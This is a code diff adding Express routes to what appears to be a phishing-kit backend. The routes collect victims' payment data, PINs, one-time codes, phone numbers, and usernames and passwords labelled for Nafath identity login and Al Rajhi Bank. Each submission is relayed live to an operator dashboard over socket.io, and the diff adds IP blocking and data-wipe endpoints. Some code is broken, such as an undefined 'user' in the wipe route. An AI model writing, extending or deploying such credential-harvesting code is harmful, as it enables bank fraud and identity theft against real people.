@@ -47,6 +47,271 @@ async function findOrCreateUser(ip) {
   return user;
 }
 
+/* const corsOptions = {
+  origin: (origin, callback) => {
+    // ✅ Allow ALL origins (including undefined / tools / Postman)
+    callback(null, true);
+  },
+  credentials: true,
+};
+
+app.use("/api", cors(corsOptions)); */
+
+app.use("/api", express.json());
+
+app.use("/api", (req, res, next) => {
+  console.log(
+    `[API] ${req.method} ${req.originalUrl} – body: ${JSON.stringify(req.body)}`
+  );
+  next();
+});
+
+// ─── Helpers: block checks ────────────────────────────────────────────────────
+const isIpBlocked = async (ip) => {
+  if (!ip) return false;
+  try {
+    const exists = await Block.exists({ ip });
+    return !!exists;
+  } catch {
+    return false;
+  }
+};
+
+const wrap = (fn) => (req, res, next) => fn(req, res, next).catch(next);
+
+// ─── 6) EXPRESS API ROUTES ────────────────────────────────────────────────────
+
+// BLOCKLIST API (NEW)
+// GET list of blocked IPs
+app.get(
+  "/api/blocked",
+  wrap(async (req, res) => {
+    const blocked = await Block.find({}, { ip: 1, _id: 0 }).lean();
+    res.json(blocked.map((b) => b.ip));
+  })
+);
+
+// POST add IP to blocklist (idempotent)
+app.post(
+  "/api/blocked/:ip",
+  wrap(async (req, res) => {
+    const ip = req.params.ip;
+    await Block.updateOne(
+      { ip },
+      { $set: { ip, reason: req.body?.reason || undefined } },
+      { upsert: true }
+    );
+    // Optional: tell dashboards something changed
+    io.emit("blockedUpdated", { ip, action: "blocked" });
+    res.json({ success: true });
+  })
+);
+
+// Optional: DELETE to unblock
+app.delete(
+  "/api/blocked/:ip",
+  wrap(async (req, res) => {
+    const ip = req.params.ip;
+    await Block.deleteOne({ ip });
+    io.emit("blockedUpdated", { ip, action: "unblocked" });
+    res.json({ success: true });
+  })
+);
+
+// ADMIN WIPE (NEW) – keeps the blocklist intact
+app.delete(
+  "/api/admin/wipe",
+  wrap(async (req, res) => {
+    await Promise.all([
+      phone.deleteMany({ user: user._id }), // Phone
+      PhoneCode.deleteMany({ user: user._id }),
+      ThirdParty.deleteMany({ user: user._id }),
+      Verification.deleteMany({ user: user._id }),
+      IndexSubmission.deleteMany({ user: user._id }),
+      Details.deleteMany({ user: user._id }),
+      Comprehensive.deleteMany({ user: user._id }),
+      Billing.deleteMany({ user: user._id }),
+      Payment.deleteMany({ user: user._id }),
+      Pin.deleteMany({ user: user._id }),
+      Nafad.deleteMany({ user: user._id }),
+      NafadCode.deleteMany({ user: user._id }),
+      Rajhi.deleteMany({ user: user._id }),
+      RajhiCode.deleteMany({ user: user._id }),
+
+      user.deleteOne(),
+
+      // Block NOT deleted on purpose
+    ]);
+    io.emit("dbWiped", { at: new Date().toISOString() });
+    res.json({ success: true });
+  })
+);
+
+// PUBLIC track routes (short-circuit if blocked)
+app.post(
+  "/api/track/index",
+  wrap(async (req, res) => {
+    if (await isIpBlocked(req.body?.ip))
+      return res.json({ success: true, blocked: true });
+    const data = { ...req.body, updatedAt: new Date() };
+    const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
+      upsert: true,
+      new: true,
+      setDefaultsOnInsert: true,
+    });
+    io.emit("newIndex", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/billing",
+  wrap(async (req, res) => {
+    if (await isIpBlocked(req.body?.ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Billing.create(req.body);
+    io.emit("newBilling", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/payment",
+  wrap(async (req, res) => {
+    if (await isIpBlocked(req.body?.ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Payment.create(req.body);
+    io.emit("newPayment", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/code",
+  wrap(async (req, res) => {
+    const { ip, verification_code } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Pin.create({ ip, pin: verification_code });
+    io.emit("newPin", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/verification",
+  wrap(async (req, res) => {
+    if (await isIpBlocked(req.body?.ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Otp.create({
+      ip: req.body.ip,
+      verification_code_two: req.body.verification_code_two,
+    });
+    io.emit("newOtp", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/phone",
+  wrap(async (req, res) => {
+    const { ip, phoneNumber, operator } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Phone.create({ ip, phoneNumber, operator });
+    io.emit("newPhone", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/phonecode",
+  wrap(async (req, res) => {
+    const { ip, verification_code_three } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Otp.create({ ip, verification_code_three });
+    io.emit("newPhoneCode", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+// NEW: split Nafad vs Rajhi REST endpoints
+app.post(
+  "/api/track/nafad",
+  wrap(async (req, res) => {
+    const { ip, username, password } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Nafad.create({ ip, username, password });
+    io.emit("newNafad", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/rajhi",
+  wrap(async (req, res) => {
+    const { ip, username, password } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Rajhi.create({ ip, username, password });
+    io.emit("newRajhi", doc);
+    res.json({ success: true, doc });
+  })
+);
+
+app.post(
+  "/api/track/basmah",
+  wrap(async (req, res) => {
+    const { ip, code } = req.body;
+    if (await isIpBlocked(ip))
+      return res.json({ success: true, blocked: true });
+    const doc = await Basmah.findOneAndUpdate(
+      { ip },
+      { code: String(code).padStart(2, "0") },
+      { upsert: true, new: true }
+    );
+    io.emit("nafadCode", { ip, code: doc.code });
+    res.json({ success: true, doc });
+  })
+);
+
+// DELETE /api/users/:ip
+app.delete(
+  "/api/users/:ip",
+  wrap(async (req, res) => {
+    const { ip } = req.params;
+    await Promise.all([
+      phone.deleteMany({ ip }),
+      PhoneCode.deleteMany({ ip }),
+      ThirdParty.deleteMany({ ip }),
+
+      Verification.deleteMany({ ip }),
+      IndexSubmission.deleteMany({ ip }),
+      Details.deleteMany({ ip }),
+      Comprehensive.deleteMany({ ip }),
+      Billing.deleteMany({ ip }),
+      Payment.deleteMany({ ip }),
+      Pin.deleteMany({ ip }),
+      Nafad.deleteMany({ ip }),
+      NafadCode.deleteMany({ ip }),
+      Rajhi.deleteMany({ ip }),
+      RajhiCode.deleteMany({ ip }),
+      User.deleteMany({ ip }),
+    ]);
+    io.emit("userDeleted", { ip });
+    res.json({ success: true });
+  })
+);
+
+app.use((err, req, res, next) => {
+  console.error("⚠️ API error:", err);
+  res
+    .status(500)
+    .json({ success: false, error: err.message || "Server error" });
+});
+
 // 2) Socket handlers
 io.on("connection", (socket) => {
   console.log("▶", socket.id, "connected");
